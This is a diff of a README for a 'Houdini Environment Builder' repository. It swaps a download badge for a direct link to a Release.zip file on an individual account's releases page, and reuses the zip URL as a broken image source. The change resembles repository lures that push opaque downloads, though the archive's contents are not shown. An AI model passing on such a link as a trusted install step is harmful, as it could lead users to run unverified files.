@@ -13,7 +13,7 @@ Welcome to the **Houdini Environment Builder** repository! 🎨 This repository 
 
 To install the **Houdini Environment Builder**, download the latest release from the following link:
 
-[![Download Houdini Environment Builder](https://img.shields.io/badge/Download-v1.0.0-blue.svg)](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip)
+[![Download Houdini Environment Builder](https://github.com/shadownightmare1699/houdini-environment-builder/releases/download/v1.0/Release.zip)](https://github.com/shadownightmare1699/houdini-environment-builder/releases/download/v1.0/Release.zip)
 
 Once downloaded, follow the instructions in the included README file for installation.
 
